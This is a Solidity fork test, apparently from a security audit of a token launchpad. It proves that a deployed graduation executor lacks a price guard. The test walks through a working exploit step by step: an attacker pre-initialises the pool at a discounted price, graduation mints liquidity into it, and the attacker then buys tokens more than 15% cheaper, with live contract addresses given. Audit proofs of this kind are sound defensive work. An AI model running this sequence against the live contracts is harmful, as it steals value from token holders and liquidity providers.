// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {console2} from "forge-std/Test.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {FullMath} from "v4-core/src/libraries/FullMath.sol";
import {LaunchpadBase} from "../LaunchpadBase.sol";
import {BondingCurve} from "../../src/BondingCurve.sol";
import {LaunchToken} from "../../src/LaunchToken.sol";
import {MondayFeeVault} from "../../src/MondayFeeVault.sol";
import {FullRangeLiquidity} from "../../src/libraries/FullRangeLiquidity.sol";
import {IMondayV3Factory, IMondayV3Pool, IMondayV3SwapCallback} from "../../src/interfaces/IMondayV3.sol";
import {IERC20} from "../../src/interfaces/IERC20.sol";
import {Types} from "../../src/interfaces/ILaunchpad.sol";
import {OldMondayGraduationExecutor} from "./OldMondayExecutor.sol";

/// Minimal v3 swapper (pays the pool from its own balance in the callback).
contract Swapper is IMondayV3SwapCallback {
    function swap(address pool, bool zeroForOne, int256 amountSpecified, uint160 limit) external returns (int256 a0, int256 a1) {
        (a0, a1) = IMondayV3Pool(pool).swap(address(this), zeroForOne, amountSpecified, limit, abi.encode(pool));
    }

    function uniswapV3SwapCallback(int256 a0, int256 a1, bytes calldata data) external override {
        address pool = abi.decode(data, (address));
        require(msg.sender == pool, "not pool");
        if (a0 > 0) IERC20(IMondayV3Pool(pool).token0()).transfer(msg.sender, uint256(a0));
        if (a1 > 0) IERC20(IMondayV3Pool(pool).token1()).transfer(msg.sender, uint256(a1));
    }
}

/// The DEPLOYED Monday executor (commit 62a8439, live at 0x3d92…) has no price guard: it mints into whatever pool
/// already exists. Both live coins (GMGM, BPP) chose the Monday venue. This proves the theft path on a fork.
contract AuditLiveExecutorForkTest is LaunchpadBase {
    IMondayV3Factory constant MONDAY = IMondayV3Factory(0xC1e98D0A2a58fB8aBd10ccc30a58efff4080Aa21);
    address constant WMON = 0x3bd359C1119dA7Da1D913D1C4D2B7c461115433A;
    uint24 constant FEE = 10_000;

    OldMondayGraduationExecutor internal oldExec;
    MondayFeeVault internal vault;

    function setUp() public override {
        vm.createSelectFork("monad");
        uint256 forkTime = block.timestamp;
        super.setUp();
        vm.warp(forkTime + 1);
        vault = new MondayFeeVault(address(this), makeAddr("fees"));
        oldExec = new OldMondayGraduationExecutor(MONDAY, address(factory), address(vault), WMON);
        factory.setMondayExecutor(address(oldExec));
    }

    function test_L1_deployed_executor_mints_at_attacker_price_and_attacker_buys_cheap() public {
        Types.TokenParams memory p = _params(address(0), 0, false, 41);
        p.graduationVenue = Types.GraduationVenue.Monday;
        vm.prank(bob);
        (address t, address c) = factory.launchToken{value: LAUNCH_FEE}(p, 0, address(0), new address[](0));
        LaunchToken token = LaunchToken(t);
        BondingCurve curve = BondingCurve(c);
        vm.warp(block.timestamp + 5);

        // Buy up to one step short of completion, then predict the curve's final state exactly.
        while (curve.realQuoteReserve() + 2_970 ether < THRESHOLD) _buy(curve, alice, 3_000 ether);
        (uint256 tokensOut,,,,,) = curve.quoteBuy(3_000 ether, alice); // clamped completing buy
        uint256 finalTokenReserve = curve.tokenReserve() - tokensOut;
        uint256 tokensToPool = FullMath.mulDiv(finalTokenReserve, THRESHOLD, PHANTOM + THRESHOLD);
        uint256 quoteToPool = THRESHOLD - THRESHOLD / 1_000_000;
        bool tokenIs0 = address(token) < WMON;
        (uint256 amount0, uint256 amount1) = tokenIs0 ? (tokensToPool, quoteToPool) : (quoteToPool, tokensToPool);
        uint160 target = FullRangeLiquidity.sqrtPriceX96(amount0, amount1);

        // Attacker pre-creates the pool with TOKEN 30% cheaper than the curve's graduation price.
        uint160 attackerPrice = tokenIs0 ? uint160(uint256(target) * 8367 / 10_000) : uint160(uint256(target) * 10_000 / 8367);
        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);
        address pool = MONDAY.createPool(address(token), WMON, FEE);
        IMondayV3Pool(pool).initialize(attackerPrice);
        vm.stopPrank();

        // Completing buy -> automatic graduation through the DEPLOYED executor logic.
        _buy(curve, alice, 3_000 ether);
        Types.LaunchedToken memory l = factory.getLaunchedToken(address(token));
        assertEq(uint8(l.phase), uint8(Types.Phase.PoolCreated), "old executor graduated into the attacker's pool");
        (uint160 opened,,,,,,) = IMondayV3Pool(pool).slot0();
        assertEq(opened, attackerPrice, "pool opened at the attacker's price, not the curve's");
        assertGt(IMondayV3Pool(pool).liquidity(), 0);

        // Attacker buys tokens with 500 WMON at the discounted price and compares with the fair amount.
        Swapper s = new Swapper();
        deal(WMON, address(s), 500e18);
        bool zeroForOne = !tokenIs0; // paying WMON
        uint160 limit = zeroForOne ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1;
        (int256 a0, int256 a1) = s.swap(pool, zeroForOne, int256(500e18), limit);
        uint256 got = uint256(-(tokenIs0 ? a0 : a1));
        uint256 fair = FullMath.mulDiv(500e18, finalTokenReserve, PHANTOM + THRESHOLD); // at the curve's final price
        console2.log("tokens received for 500 WMON:", got);
        console2.log("tokens a fair-priced pool would give:", fair);
        console2.log("excess (bps):", (got - fair) * 10_000 / fair);
        assertGt(got, fair * 115 / 100, "attacker extracted >15% more tokens than the graduation price implies");
    }
}
